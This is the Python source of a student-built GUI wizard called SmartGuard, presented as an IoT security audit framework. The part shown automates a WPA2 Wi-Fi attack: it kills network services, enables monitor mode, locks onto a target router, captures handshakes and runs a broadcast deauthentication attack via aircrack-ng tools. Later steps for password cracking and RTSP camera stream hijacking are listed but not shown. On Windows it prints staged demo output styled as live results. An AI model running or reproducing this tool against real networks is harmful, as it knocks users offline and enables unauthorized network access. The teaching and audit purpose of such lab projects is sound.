"""
SmartGuard GUI  —  IoT Security Audit Framework
Version  : 2.0
Authors  : Sulaiman Almanea · Muath Alyhya · Abdulaziz Alharbi
           Majed Alghrras · Mansour Alsuwayh
Supervisor: Dr. Ahmed Elaraby
College  : Buraydah Colleges — Dept. of Cybersecurity
Year     : 2025 / 2026

Step-by-step wizard:
  Phase 01  Steps 1-8   Wireless Attack
  Phase 02  Steps 9-11  Network Reconnaissance
  Phase 03  Steps 12-14 Hardening Verification
  Final     Step  15    Session Report
"""

import customtkinter as ctk
import threading
import subprocess
import platform
import os
import time
from datetime import datetime

# ── Appearance ───────────────────────────────────────────────
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

IS_LINUX = platform.system() == "Linux"

C = {
    "bg":      "#0d1117",
    "panel":   "#161b22",
    "card":    "#1c2128",
    "border":  "#30363d",
    "cyan":    "#39d0d8",
    "green":   "#3fb950",
    "yellow":  "#d29922",
    "red":     "#f85149",
    "text":    "#e6edf3",
    "dim":     "#8b949e",
    "blue":    "#1f6feb",
    "purple":  "#8b5cf6",
}

# ════════════════════════════════════════════════════════════
#  WIZARD STEP DEFINITIONS
# ════════════════════════════════════════════════════════════
STEPS = [
    # (id,  phase_label,              title,                          phase_color)
    ( 1,  "Phase 01 · Wireless",  "Select Wireless Interface",        C["cyan"]),
    ( 2,  "Phase 01 · Wireless",  "Kill Interfering Processes",       C["cyan"]),
    ( 3,  "Phase 01 · Wireless",  "Enable Monitor Mode",              C["cyan"]),
    ( 4,  "Phase 01 · Wireless",  "Scan Surrounding Networks",        C["cyan"]),
    ( 5,  "Phase 01 · Wireless",  "Set Target (BSSID & Channel)",     C["cyan"]),
    ( 6,  "Phase 01 · Wireless",  "Capture WPA2 Handshake",           C["cyan"]),
    ( 7,  "Phase 01 · Wireless",  "Deauthentication Attack",          C["cyan"]),
    ( 8,  "Phase 01 · Wireless",  "Crack Password (aircrack-ng)",     C["cyan"]),
    ( 9,  "Phase 02 · Recon",     "Host Discovery",                   C["purple"]),
    (10,  "Phase 02 · Recon",     "Port Scan on Camera",              C["purple"]),
    (11,  "Phase 02 · Recon",     "RTSP Stream Hijack",               C["purple"]),
    (12,  "Phase 03 · Hardening", "Apply Hardening Measures",         C["green"]),
    (13,  "Phase 03 · Hardening", "Verify Hardening with Nmap",       C["green"]),
    (14,  "Phase 03 · Hardening", "Hardening Score & Summary",        C["green"]),
    (15,  "Report",               "Generate Session Report",          C["yellow"]),
]
TOTAL = len(STEPS)


# ════════════════════════════════════════════════════════════
#  TERMINAL WIDGET
# ════════════════════════════════════════════════════════════
class Terminal(ctk.CTkTextbox):
    def __init__(self, master, **kw):
        super().__init__(
            master,
            font=("Consolas", 12),
            fg_color=C["bg"],
            text_color=C["text"],
            border_color=C["border"],
            border_width=1,
            wrap="word",
            state="disabled",
            **kw,
        )
        tx = self._textbox
        tx.tag_config("cyan",   foreground=C["cyan"])
        tx.tag_config("green",  foreground=C["green"])
        tx.tag_config("yellow", foreground=C["yellow"])
        tx.tag_config("red",    foreground=C["red"])
        tx.tag_config("dim",    foreground=C["dim"])
        tx.tag_config("purple", foreground=C["purple"])
        tx.tag_config("cmd",    foreground="#79c0ff",
                      font=("Consolas", 12, "bold"))
        tx.tag_config("bold",   font=("Consolas", 12, "bold"))
        tx.tag_config("key",    foreground=C["green"],
                      font=("Consolas", 13, "bold"))

    def write(self, text, tag=""):
        self.configure(state="normal")
        if tag:
            self._textbox.insert("end", text, tag)
        else:
            self._textbox.insert("end", text)
        self._textbox.see("end")
        self.configure(state="disabled")

    def clear(self):
        self.configure(state="normal")
        self.delete("0.0", "end")
        self.configure(state="disabled")

    # convenience ─────────────────────────────────────────────
    def sep(self, char="─", color="dim"):
        self.write("  " + char * 60 + "\n", color)

    def section(self, txt, color="cyan"):
        self.write("\n")
        self.sep("═", color)
        self.write(f"  ◈  {txt}\n", color)
        self.sep("═", color)
        self.write("\n")

    def info(self, m):  self.write(f"  [*] {m}\n", "cyan")
    def ok(self,   m):  self.write(f"  [✓] {m}\n", "green")
    def warn(self, m):  self.write(f"  [!] {m}\n", "yellow")
    def err(self,  m):  self.write(f"  [✗] {m}\n", "red")
    def cmd(self,  m):  self.write(f"\n  $ {m}\n",  "cmd")
    def dim(self,  m):  self.write(f"      {m}\n",  "dim")
    def result(self,m): self.write(f"  [+] {m}\n",  "green")


# ════════════════════════════════════════════════════════════
#  SMALL HELPERS
# ════════════════════════════════════════════════════════════
def _entry(parent, label, default="", width=None):
    """Return a labelled CTkEntry and pack it."""
    row = ctk.CTkFrame(parent, fg_color="transparent")
    row.pack(fill="x", pady=3)
    ctk.CTkLabel(
        row, text=label, width=200, anchor="w",
        font=("Consolas", 11), text_color=C["dim"],
    ).pack(side="left")
    kw = dict(
        fg_color=C["bg"], border_color=C["border"],
        text_color=C["text"], font=("Consolas", 11), height=28,
    )
    if width:
        kw["width"] = width
    e = ctk.CTkEntry(row, **kw)
    e.insert(0, default)
    e.pack(side="left", fill="x", expand=True, padx=(4, 0))
    return e


def _btn(parent, text, cmd, color=None, side="left", pady=0):
    color = color or C["blue"]
    b = ctk.CTkButton(
        parent, text=text, command=cmd,
        font=("Consolas", 12, "bold"),
        fg_color=color, hover_color=_darken(color),
        text_color="white", height=32, corner_radius=6,
    )
    b.pack(side=side, padx=4, pady=pady)
    return b


def _darken(hex_color):
    """Return a slightly darker shade for hover."""
    return {
        C["blue"]:   "#2d7dd8",
        C["green"]:  "#2ea043",
        C["red"]:    "#da3633",
        C["yellow"]: "#b08800",
        C["cyan"]:   "#2baab0",
        C["purple"]: "#7c3aed",
    }.get(hex_color, "#555")


def _run_cmd(cmd, timeout=90):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=timeout)
        return (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return str(e)


# ════════════════════════════════════════════════════════════
#  MAIN APP
# ════════════════════════════════════════════════════════════
class SmartGuardApp(ctk.CTk):

    VERSION = "2.0"

    def __init__(self):
        super().__init__()
        self.title(f"SmartGuard  v{self.VERSION}  —  IoT Security Audit Framework")
        self.geometry("1280x780")
        self.minsize(1000, 640)
        self.configure(fg_color=C["bg"])

        # Session state
        self.current_step  = 0          # 0 = welcome
        self.step_done     = [False] * (TOTAL + 1)
        self.iface         = "wlan0"
        self.mon_iface     = "wlan0mon"
        self.bssid         = "1E:4A:44:D1:44:4B"
        self.channel       = "6"
        self.client_mac    = "FF:FF:FF:FF:FF:FF"
        self.cap_file      = "/tmp/sg_capture"
        self.wordlist      = "/usr/share/wordlists/rockyou.txt"
        self.network_range = "192.168.8.0/24"
        self.target_ip     = "192.168.8.186"
        self.scan_ports    = "80,554,8080,443,22,23,21"
        self.hardening     = {}
        self.session_log   = []
        self.h_score       = 0

        self._step_labels  = []

        self._build_ui()
        self._show_welcome()

    # ── UI skeleton ──────────────────────────────────────────
    def _build_ui(self):
        # ── header
        hdr = ctk.CTkFrame(self, fg_color=C["panel"],
                            corner_radius=0, height=52)
        hdr.pack(fill="x")
        hdr.pack_propagate(False)
        ctk.CTkLabel(
            hdr, text="⚡  SmartGuard",
            font=("Consolas", 19, "bold"), text_color=C["cyan"],
        ).pack(side="left", padx=18, pady=10)
        ctk.CTkLabel(
            hdr, text="IoT Security Audit Framework",
            font=("Consolas", 12), text_color=C["dim"],
        ).pack(side="left")
        ctk.CTkLabel(
            hdr,
            text=f"v{self.VERSION}  |  Buraydah Colleges · Cybersecurity  |  🥇 1st Place",
            font=("Consolas", 11), text_color=C["dim"],
        ).pack(side="right", padx=18)

        # ── progress bar row
        pbar_row = ctk.CTkFrame(self, fg_color=C["panel"],
                                corner_radius=0, height=36)
        pbar_row.pack(fill="x")
        pbar_row.pack_propagate(False)

        self._prog_label = ctk.CTkLabel(
            pbar_row, text="Welcome",
            font=("Consolas", 11), text_color=C["dim"],
        )
        self._prog_label.pack(side="left", padx=14)

        self._prog_bar = ctk.CTkProgressBar(
            pbar_row, fg_color=C["card"],
            progress_color=C["cyan"], height=6,
        )
        self._prog_bar.pack(side="left", fill="x", expand=True, padx=10, pady=13)
        self._prog_bar.set(0)

        self._step_counter = ctk.CTkLabel(
            pbar_row, text="Step 0 / 15",
            font=("Consolas", 11), text_color=C["dim"],
        )
        self._step_counter.pack(side="right", padx=14)

        # ── body
        body = ctk.CTkFrame(self, fg_color=C["bg"], corner_radius=0)
        body.pack(fill="both", expand=True)

        self._build_step_panel(body)

        right = ctk.CTkFrame(body, fg_color=C["bg"], corner_radius=0)
        right.pack(side="left", fill="both", expand=True,
                   padx=(0, 12), pady=10)

        self.terminal = Terminal(right)
        self.terminal.pack(fill="both", expand=True, pady=(0, 8))

        self.config_frame = ctk.CTkFrame(
            right, fg_color=C["panel"], corner_radius=8, height=230,
        )
        self.config_frame.pack(fill="x")
        self.config_frame.pack_propagate(False)

        # ── status bar
        bar = ctk.CTkFrame(self, fg_color=C["panel"],
                           corner_radius=0, height=26)
        bar.pack(fill="x", side="bottom")
        bar.pack_propagate(False)
        self._status_var = ctk.StringVar(value="Ready")
        self._target_var = ctk.StringVar(value="Target: —")
        ctk.CTkLabel(bar, textvariable=self._status_var,
                     font=("Consolas", 10), text_color=C["dim"]).pack(
            side="left", padx=14)
        ctk.CTkLabel(bar, textvariable=self._target_var,
                     font=("Consolas", 10), text_color=C["dim"]).pack(
            side="left", padx=14)
        ctk.CTkLabel(
            bar,
            text=f"Platform: {platform.system()} {platform.release()}  |  "
                 f"{'🐧 Linux — Live Mode' if IS_LINUX else '🪟 Windows — Demo Mode'}",
            font=("Consolas", 10), text_color=C["dim"],
        ).pack(side="right", padx=14)

    # ── Left step panel ──────────────────────────────────────
    def _build_step_panel(self, parent):
        sp = ctk.CTkScrollableFrame(
            parent, fg_color=C["panel"], corner_radius=0, width=230,
        )
        sp.pack(side="left", fill="y", padx=(10, 6), pady=10)

        ctk.CTkButton(
            sp, text="🏠  Start Over",
            font=("Consolas", 11), fg_color=C["card"],
            hover_color=C["border"], text_color=C["text"],
            height=30, corner_radius=6,
            command=self._show_welcome,
        ).pack(fill="x", pady=(4, 10), padx=4)

        phase_color = None
        for sid, phase, title, color in STEPS:
            if color != phase_color:
                phase_color = color
                phase_name = phase
                ctk.CTkLabel(
                    sp, text=phase_name,
                    font=("Consolas", 10, "bold"),
                    text_color=color,
                ).pack(anchor="w", padx=8, pady=(10, 2))

            lbl = ctk.CTkLabel(
                sp,
                text=f"  {sid:02d}  {title}",
                font=("Consolas", 10),
                text_color=C["dim"],
                anchor="w", justify="left",
                wraplength=200,
                cursor="hand2",
            )
            lbl.pack(fill="x", padx=4, pady=1)
            lbl.bind("<Button-1>", lambda e, s=sid: self._go_to(s))
            self._step_labels.append(lbl)

    # ── Progress helpers ─────────────────────────────────────
    def _update_progress(self, step_num):
        self.current_step = step_num
        pct = step_num / TOTAL
        self._prog_bar.set(pct)
        self._step_counter.configure(text=f"Step {step_num} / {TOTAL}")
        if step_num == 0:
            self._prog_label.configure(text="Welcome")
        else:
            _, phase, title, _ = STEPS[step_num - 1]
            self._prog_label.configure(text=f"{phase}  ·  {title}")

        for i, lbl in enumerate(self._step_labels):
            sid = i + 1
            if sid < step_num:
                lbl.configure(text_color=C["green"],
                              font=("Consolas", 10))
            elif sid == step_num:
                lbl.configure(text_color=C["cyan"],
                              font=("Consolas", 10, "bold"))
            else:
                lbl.configure(text_color=C["dim"],
                              font=("Consolas", 10))

    def _set_status(self, msg):
        self._status_var.set(f"  {msg}")

    def _clear_config(self):
        for w in self.config_frame.winfo_children():
            w.destroy()

    # Navigation row at bottom of config panel ─────────────
    def _nav_buttons(self, parent, next_fn, prev_fn=None,
                     run_fn=None, run_label="▶  Run This Step",
                     run_color=None):
        row = ctk.CTkFrame(parent, fg_color="transparent")
        row.pack(fill="x", padx=14, pady=(6, 10))

        if prev_fn:
            _btn(row, "← Back", prev_fn, color=C["card"])

        ctk.CTkFrame(row, fg_color="transparent").pack(
            side="left", fill="x", expand=True)

        if run_fn:
            _btn(row, run_label, run_fn,
                 color=run_color or C["blue"], side="right")

        _btn(row, "Next Step →", next_fn,
             color=C["green"], side="right")

    def _go_to(self, step_num):
        fns = {
            1:  self._step1,   2:  self._step2,
            3:  self._step3,   4:  self._step4,
            5:  self._step5,   6:  self._step6,
            7:  self._step7,   8:  self._step8,
            9:  self._step9,   10: self._step10,
            11: self._step11,  12: self._step12,
            13: self._step13,  14: self._step14,
            15: self._step15,
        }
        fns[step_num]()

    # ════════════════════════════════════════════════════════
    #  WELCOME
    # ════════════════════════════════════════════════════════
    def _show_welcome(self):
        self._clear_config()
        self.terminal.clear()
        self._update_progress(0)

        t = self.terminal
        t.write(
            "\n"
            "  ███████╗███╗   ███╗ █████╗ ██████╗ ████████╗\n"
            "  ██╔════╝████╗ ████║██╔══██╗██╔══██╗╚══██╔══╝\n"
            "  ███████╗██╔████╔██║███████║██████╔╝   ██║   \n"
            "  ╚════██║██║╚██╔╝██║██╔══██║██╔══██╗   ██║   \n"
            "  ███████║██║ ╚═╝ ██║██║  ██║██║  ██║   ██║   \n"
            "  ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   \n"
            "   ██████╗ ██╗   ██╗ █████╗ ██████╗ ██████╗    \n"
            "  ██╔════╝ ██║   ██║██╔══██╗██╔══██╗██╔══██╗   \n"
            "  ██║  ███╗██║   ██║███████║██████╔╝██║  ██║   \n"
            "  ██║   ██║██║   ██║██╔══██║██╔══██╗██║  ██║   \n"
            "  ╚██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝   \n"
            "   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝    \n\n",
            "cyan",
        )
        t.write(f"  IoT Security Audit Framework  —  v{self.VERSION}\n", "cyan")
        t.write("  Buraydah Colleges  ·  Dept. of Cybersecurity  ·  2025/2026\n", "dim")
        t.write("  Supervised by: Dr. Ahmed Elaraby\n\n", "dim")
        t.sep("─", "dim")
        t.warn("FOR CONTROLLED LAB ENVIRONMENTS ONLY")
        t.write("  Unauthorized use on real networks is illegal.\n", "dim")
        t.sep("─", "dim")
        t.write("\n")

        t.section("WIZARD  —  15 Steps")
        rows = [
            (C["cyan"],   "Steps  1–8 ",  "Phase 01",
             "Wireless attack, handshake capture, password cracking"),
            (C["purple"], "Steps  9–11",  "Phase 02",
             "Host discovery, port scan, RTSP stream hijack"),
            (C["green"],  "Steps 12–14",  "Phase 03",
             "Defense-in-Depth hardening & verification"),
            (C["yellow"], "Step   15  ",  "Report  ",
             "Generate full session report"),
        ]
        for color, steps, phase, desc in rows:
            t.write(f"  {steps}  ", "dim")
            t.write(f"{phase}  ", color)
            t.write(f"{desc}\n", "")
        t.write("\n\n  Press  Start →  to begin.\n\n", "dim")

        # Config panel ── welcome card
        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="🥇  SmartGuard v2.0",
            font=("Consolas", 15, "bold"), text_color=C["cyan"],
        ).pack(pady=(18, 4))
        ctk.CTkLabel(
            cf,
            text="A step-by-step guided audit wizard.\n"
                 "Each step shows the exact command, then executes it.",
            font=("Consolas", 11), text_color=C["dim"],
        ).pack()
        mode = "🐧 Linux — Live Execution Mode" if IS_LINUX \
            else "🪟 Windows — Demo / Presentation Mode"
        ctk.CTkLabel(
            cf, text=mode,
            font=("Consolas", 11), text_color=C["yellow"],
        ).pack(pady=6)
        ctk.CTkButton(
            cf, text="Start Wizard  →",
            font=("Consolas", 14, "bold"),
            fg_color=C["cyan"], hover_color=_darken(C["cyan"]),
            text_color=C["bg"], height=38, corner_radius=8,
            command=self._step1,
        ).pack(pady=10)

    # ════════════════════════════════════════════════════════
    # ── PHASE 01 ─────────────────────────────────────────
    # ════════════════════════════════════════════════════════

    # Step 1 — Select Interface
    def _step1(self):
        self._clear_config()
        self._update_progress(1)
        t = self.terminal
        t.clear()
        t.section("Step 01  ·  Select Wireless Interface", C["cyan"])
        t.info("We need to identify your wireless adapter before anything else.")
        t.write("\n")
        t.write("  What we're doing:\n", "bold")
        t.dim("Wireless cards have a name (wlan0, wlan1, …).")
        t.dim("We must know this name to put the card into monitor mode.")
        t.write("\n")
        t.write("  On Linux — run this to list your cards:\n", "")
        t.cmd("iwconfig   or   ip link show")
        t.write("\n")
        t.dim("Look for lines showing  Mode:Managed  — that's your Wi-Fi card.")
        t.write("\n")
        if IS_LINUX:
            out = _run_cmd("iwconfig 2>/dev/null || ip link show")
            for line in out.splitlines():
                t.dim(line)

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 01  —  Wireless Interface",
            font=("Consolas", 12, "bold"), text_color=C["cyan"],
        ).pack(anchor="w", padx=14, pady=(10, 6))
        form = ctk.CTkFrame(cf, fg_color="transparent")
        form.pack(fill="x", padx=14)
        self._e_iface = _entry(form, "Wireless Interface Name", self.iface)
        ctk.CTkLabel(
            cf,
            text="  Typical values:  wlan0  /  wlan1  /  wlan2",
            font=("Consolas", 10), text_color=C["dim"],
        ).pack(anchor="w", padx=14)

        def _save_next():
            self.iface = self._e_iface.get() or self.iface
            self.mon_iface = self.iface + "mon"
            t.ok(f"Interface set to: {self.iface}  (monitor: {self.mon_iface})")
            self._step2()
        self._nav_buttons(cf, _save_next)

    # Step 2 — Kill Processes
    def _step2(self):
        self._clear_config()
        self._update_progress(2)
        t = self.terminal
        t.clear()
        t.section("Step 02  ·  Kill Interfering Processes", C["cyan"])
        t.info("Network managers and DHCP clients interfere with monitor mode.")
        t.write("\n")
        t.write("  What we're doing:\n", "bold")
        t.dim("Programs like NetworkManager keep using the Wi-Fi card normally.")
        t.dim("We must stop them so the card is free for packet capture.")
        t.write("\n")
        t.cmd(f"sudo airmon-ng check kill")
        t.write("\n")

        def _run():
            self._set_status("Killing interfering processes…")
            cmd = "sudo airmon-ng check kill"
            t.write("\n  Running…\n", "yellow")
            if IS_LINUX:
                out = _run_cmd(cmd)
                for line in out.splitlines():
                    t.dim(line)
            else:
                time.sleep(0.6)
                t.dim("Killing NetworkManager (PID 1423)")
                t.dim("Killing wpa_supplicant (PID 1567)")
            t.ok("Done — processes killed")
            self.session_log.append(f"[CMD] {cmd}")
            self._set_status("Step 02 complete")

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 02  —  Kill Interfering Processes",
            font=("Consolas", 12, "bold"), text_color=C["cyan"],
        ).pack(anchor="w", padx=14, pady=(10, 6))
        ctk.CTkLabel(
            cf,
            text="  This stops NetworkManager and wpa_supplicant temporarily.\n"
                 "  Your Wi-Fi will disconnect — this is expected.",
            font=("Consolas", 11), text_color=C["dim"], justify="left",
        ).pack(anchor="w", padx=14)
        self._nav_buttons(
            cf, self._step3, self._step1,
            run_fn=lambda: threading.Thread(target=_run, daemon=True).start(),
            run_label="▶  Kill Processes",
        )

    # Step 3 — Monitor Mode
    def _step3(self):
        self._clear_config()
        self._update_progress(3)
        t = self.terminal
        t.clear()
        t.section("Step 03  ·  Enable Monitor Mode", C["cyan"])
        t.info("Monitor mode lets the card capture ALL Wi-Fi packets around it.")
        t.write("\n")
        t.write("  What we're doing:\n", "bold")
        t.dim("Normally a Wi-Fi card only captures packets addressed to it.")
        t.dim("Monitor mode = listen to EVERYTHING — like a radio scanner.")
        t.dim("airmon-ng renames the interface (wlan0 → wlan0mon).")
        t.write("\n")
        t.cmd(f"sudo airmon-ng start {self.iface}")
        t.write("\n")
        t.dim(f"After this command your interface becomes: {self.mon_iface}")

        def _run():
            self._set_status("Enabling monitor mode…")
            cmd = f"sudo airmon-ng start {self.iface}"
            t.write("\n  Running…\n", "yellow")
            if IS_LINUX:
                out = _run_cmd(cmd)
                for line in out.splitlines():
                    if "monitor mode" in line.lower():
                        t.write(f"  {line}\n", "green")
                    else:
                        t.dim(line)
            else:
                time.sleep(0.7)
                t.dim(f"PHY     Interface   Driver      Chipset")
                t.dim(f"phy0    {self.iface:<12}ath9k       Atheros AR9271")
                t.write(f"\n  [✓] (mac80211 monitor mode already enabled for "
                        f"[phy0]{self.iface} on [{self.mon_iface}])\n", "green")
            t.ok(f"Monitor mode enabled  →  {self.mon_iface}")
            self.session_log.append(f"[CMD] {cmd}")
            self._set_status("Step 03 complete")

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 03  —  Enable Monitor Mode",
            font=("Consolas", 12, "bold"), text_color=C["cyan"],
        ).pack(anchor="w", padx=14, pady=(10, 6))
        form = ctk.CTkFrame(cf, fg_color="transparent")
        form.pack(fill="x", padx=14)
        ctk.CTkLabel(
            cf,
            text=f"  Interface:  {self.iface}  →  {self.mon_iface}  (after command)",
            font=("Consolas", 11), text_color=C["dim"],
        ).pack(anchor="w", padx=14)
        self._nav_buttons(
            cf, self._step4, self._step2,
            run_fn=lambda: threading.Thread(target=_run, daemon=True).start(),
            run_label="▶  Enable Monitor Mode",
            run_color=C["cyan"],
        )

    # Step 4 — Scan Networks
    def _step4(self):
        self._clear_config()
        self._update_progress(4)
        t = self.terminal
        t.clear()
        t.section("Step 04  ·  Scan Surrounding Networks", C["cyan"])
        t.info("We scan the air to find available Wi-Fi networks and their details.")
        t.write("\n")
        t.write("  What we're doing:\n", "bold")
        t.dim("airodump-ng listens on all channels and lists every network.")
        t.dim("We need to find our target — note its BSSID and Channel.")
        t.dim("BSSID = router MAC address   (looks like: AA:BB:CC:DD:EE:FF)")
        t.dim("Channel = frequency band in use (1, 6, 11, …)")
        t.write("\n")
        t.cmd(f"sudo airodump-ng {self.mon_iface}")
        t.write("\n")
        t.warn("This opens a live scan window. Press Ctrl+C when you see the target.")

        def _run():
            self._set_status("Scanning networks…")
            cmd = f"sudo airodump-ng {self.mon_iface}"
            t.write("\n  Running scan (demo output):\n\n", "yellow")
            if IS_LINUX:
                t.warn("On Linux: run this in a separate terminal, note BSSID & Channel")
                t.cmd(cmd)
            else:
                demo = [
                    " BSSID              PWR  Beacons  #Data  CH   ENC    ESSID",
                    " ─────────────────────────────────────────────────────────────",
                    f" {self.bssid}  -45      312    128   {self.channel}   WPA2   HomeNetwork   ← TARGET",
                    "  BC:30:7D:XX:XX:XX  -72       89     14   1   WPA2   Neighbor_5G",
                    "  F4:EC:38:XX:XX:XX  -81       44      3  11   WPA2   Office_WiFi",
                ]
                for line in demo:
                    t.write(f"  {line}\n",
                            "green" if "TARGET" in line else "dim")
                    time.sleep(0.2)
            t.write("\n")
            t.info("Look for your target network in the list above.")
            t.info("Note the BSSID and CH (channel) — enter them in Step 05.")
            self._set_status("Step 04 complete — note BSSID & Channel")

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 04  —  Scan Surrounding Networks",
            font=("Consolas", 12, "bold"), text_color=C["cyan"],
        ).pack(anchor="w", padx=14, pady=(10, 6))
        ctk.CTkLabel(
            cf,
            text="  Scans all channels and lists nearby Wi-Fi networks.\n"
                 "  Identify your target, then note its BSSID and Channel for the next step.",
            font=("Consolas", 11), text_color=C["dim"], justify="left",
        ).pack(anchor="w", padx=14)
        self._nav_buttons(
            cf, self._step5, self._step3,
            run_fn=lambda: threading.Thread(target=_run, daemon=True).start(),
            run_label="▶  Scan Networks",
        )

    # Step 5 — Set Target
    def _step5(self):
        self._clear_config()
        self._update_progress(5)
        t = self.terminal
        t.clear()
        t.section("Step 05  ·  Set Target — BSSID & Channel", C["cyan"])
        t.info("Enter the target router's MAC address and Wi-Fi channel from the scan.")
        t.write("\n")
        t.write("  What we're doing:\n", "bold")
        t.dim("We tell airodump-ng exactly which router to watch.")
        t.dim("By locking on one channel we capture packets faster and cleaner.")
        t.dim("We also need the target client MAC if we want a directed deauth attack.")
        t.write("\n")
        t.dim("From Step 04 you should have noted:")
        t.dim(f"  BSSID   = router MAC  (currently: {self.bssid})")
        t.dim(f"  Channel = Wi-Fi channel (currently: {self.channel})")

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 05  —  Target Configuration",
            font=("Consolas", 12, "bold"), text_color=C["cyan"],
        ).pack(anchor="w", padx=14, pady=(10, 6))
        form = ctk.CTkFrame(cf, fg_color="transparent")
        form.pack(fill="x", padx=14)
        left  = ctk.CTkFrame(form, fg_color="transparent")
        right = ctk.CTkFrame(form, fg_color="transparent")
        left.pack(side="left", fill="x", expand=True, padx=(0, 12))
        right.pack(side="left", fill="x", expand=True)

        self._e_bssid   = _entry(left,  "Router BSSID (MAC)", self.bssid)
        self._e_channel = _entry(left,  "Channel",            self.channel)
        self._e_client  = _entry(right, "Client MAC  (FF:FF:…=broadcast)",
                                 self.client_mac)
        self._e_cap     = _entry(right, "Capture File (no ext)", self.cap_file)

        def _save_next():
            self.bssid      = self._e_bssid.get()   or self.bssid
            self.channel    = self._e_channel.get() or self.channel
            self.client_mac = self._e_client.get()  or self.client_mac
            self.cap_file   = self._e_cap.get()     or self.cap_file
            t.ok(f"Target set  →  BSSID: {self.bssid}  CH: {self.channel}")
            t.ok(f"Capture file: {self.cap_file}-01.cap")
            self._step6()
        self._nav_buttons(cf, _save_next, self._step4)

    # Step 6 — Capture Handshake (starts capture, then sends to Step 7)
    def _step6(self):
        self._clear_config()
        self._update_progress(6)
        self._capture_started = False
        t = self.terminal
        t.clear()
        t.section("Step 06  ·  Start Handshake Capture", C["cyan"])
        t.info("We lock airodump-ng on the target router and listen for a handshake.")
        t.write("\n")
        t.write("  What we're doing:\n", "bold")
        t.dim("A WPA2 handshake is exchanged every time a device connects to the router.")
        t.dim("It contains an encrypted copy of the Wi-Fi password.")
        t.dim("We capture it here — then Step 07 will FORCE clients to reconnect,")
        t.dim("which causes the handshake to be broadcast so we catch it.")
        t.write("\n")
        cmd = (f"sudo airodump-ng --bssid {self.bssid} "
               f"--channel {self.channel} "
               f"-w {self.cap_file} {self.mon_iface}")
        t.cmd(cmd)
        t.write("\n")
        t.write("  ┌─────────────────────────────────────────────────┐\n", "yellow")
        t.write("  │  FLOW:  ▶ Start Capture here  →  go to Step 07  │\n", "yellow")
        t.write("  │         Step 07 kicks clients → handshake caught │\n", "yellow")
        t.write("  └─────────────────────────────────────────────────┘\n", "yellow")

        def _run():
            self._set_status("Capture running — waiting for handshake…")
            self._capture_started = True
            t.write("\n")
            if IS_LINUX:
                t.write("  Opening capture window…\n", "yellow")
                subprocess.Popen(
                    f"xterm -bg black -fg green -T 'SmartGuard | CAPTURE' "
                    f"-e 'sudo airodump-ng --bssid {self.bssid} "
                    f"--channel {self.channel} -w {self.cap_file} {self.mon_iface}'",
                    shell=True,
                )
                t.ok("airodump-ng running in background window.")
            else:
                demo = [
                    f"  CH  {self.channel} ][ Elapsed: 0 s",
                    f"",
                    f"  BSSID              PWR  RXQ  Beacons  #Data  CH  ENC   ESSID",
                    f"  {self.bssid}  -45   60      312    128   {self.channel}  WPA2  HomeNetwork",
                    f"",
                    f"  STATION            BSSID               PWR  Rate  Lost  Frames",
                    f"  {self.client_mac}  {self.bssid}  -55  54e-54e    0     712",
                ]
                for line in demo:
                    t.dim(line)
                    time.sleep(0.12)
            t.write("\n")
            t.write("  ══════════════════════════════════════════════════\n", "yellow")
            t.write("  ⚡  Capture is RUNNING.  Press 'Next → Deauth' now!\n", "yellow")
            t.write("  ══════════════════════════════════════════════════\n", "yellow")
            self.session_log.append(f"[CMD] {cmd}")
            # Unlock the next button visually
            self.after(0, lambda: self._s6_next_btn.configure(
                fg_color=C["red"], text="⚡ Step 07 — Deauth NOW →"
            ))

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 06  —  Start Handshake Capture",
            font=("Consolas", 12, "bold"), text_color=C["cyan"],
        ).pack(anchor="w", padx=14, pady=(10, 4))

        info_box = ctk.CTkFrame(cf, fg_color=C["card"], corner_radius=6)
        info_box.pack(fill="x", padx=14, pady=4)
        ctk.CTkLabel(
            info_box,
            text=f"  Target  : {self.bssid}    CH {self.channel}\n"
                 f"  Saving  : {self.cap_file}-01.cap\n"
                 f"  Interface: {self.mon_iface}",
            font=("Consolas", 11), text_color=C["dim"],
            justify="left",
        ).pack(anchor="w", padx=8, pady=6)

        btn_row = ctk.CTkFrame(cf, fg_color="transparent")
        btn_row.pack(fill="x", padx=14, pady=(6, 10))

        _btn(btn_row, "← Back", self._step5, color=C["card"])

        _btn(
            btn_row, "▶  Start Capture",
            lambda: threading.Thread(target=_run, daemon=True).start(),
            color=C["cyan"], side="left",
        )
        ctk.CTkFrame(btn_row, fg_color="transparent").pack(
            side="left", fill="x", expand=True)

        self._s6_next_btn = ctk.CTkButton(
            btn_row,
            text="Next → Deauth  →",
            command=self._step7,
            font=("Consolas", 12, "bold"),
            fg_color=C["green"], hover_color=_darken(C["green"]),
            text_color="white", height=32, corner_radius=6,
        )
        self._s6_next_btn.pack(side="right", padx=4)

    # Step 7 — Deauth Attack (kicks clients → Step 6 captures handshake)
    def _step7(self):
        self._clear_config()
        self._update_progress(7)
        t = self.terminal
        t.clear()
        t.section("Step 07  ·  Deauthentication Attack", C["red"])
        t.write("\n")
        t.write("  ┌──────────────────────────────────────────────────────┐\n", "cyan")
        t.write("  │  Step 06 capture is running in the background.        │\n", "cyan")
        t.write("  │  This step kicks all clients off the router.          │\n", "cyan")
        t.write("  │  They reconnect automatically → handshake is caught.  │\n", "cyan")
        t.write("  └──────────────────────────────────────────────────────┘\n\n", "cyan")
        t.write("  What we're doing:\n", "bold")
        t.dim("aireplay-ng sends forged 'deauthenticate' frames (IEEE 802.11).")
        t.dim("The router and client both receive them and terminate the session.")
        t.dim("The client auto-reconnects in milliseconds → WPA2 handshake fires.")
        t.dim("Step 06 (still running) captures that handshake to the .cap file.")
        t.write("\n")
        cmd = (f"sudo aireplay-ng --deauth 20 "
               f"-a {self.bssid} "
               f"-c {self.client_mac} {self.mon_iface}")
        t.cmd(cmd)

